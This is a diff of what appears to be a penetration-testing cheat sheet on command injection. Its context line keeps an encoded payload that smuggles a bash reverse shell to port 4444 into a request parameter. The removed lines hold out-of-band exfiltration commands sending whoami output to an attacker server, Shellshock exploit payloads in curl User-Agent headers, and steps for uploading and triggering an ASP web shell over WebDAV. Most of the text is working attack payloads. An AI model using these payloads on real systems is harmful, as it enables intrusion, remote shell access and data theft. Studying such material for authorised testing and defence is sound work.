@@ -381,43 +381,9 @@ command %0A command
 || command
 `command`
 $(command)
+```
 
+```
 example: Archive=test%20--version%3Bbash+-c+'bash+-i+>%26+/dev/tcp/192.168.x.xxx/4444+0>%261'
 ```
 
--> Out Of Band - OOB Exploitation
-```
-curl http://$(whoami).site.com/
-curl http://`whoami`.site.com/
-nslookup `whoami`.attacker-server.com &
-curl http://192.168.0.20/$(whoami)
-```
-
--> Check if the commands are executed by PowerShell or CMD
-```
-(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
-```
-
-## Shellshock
--> Detection
-```
-nikto -h <IP> -C all
-```
-	
--> Exploit
-```
-curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
-curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
-curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
-```
-
-## WebDAV
--> Connect to WebDAV server and send malicious file to shell
-```
-cadaver http://<IP>/webdav
-put <shell.asp>
-```
-```
-curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
-```
-https://github.com/notroj/cadaver
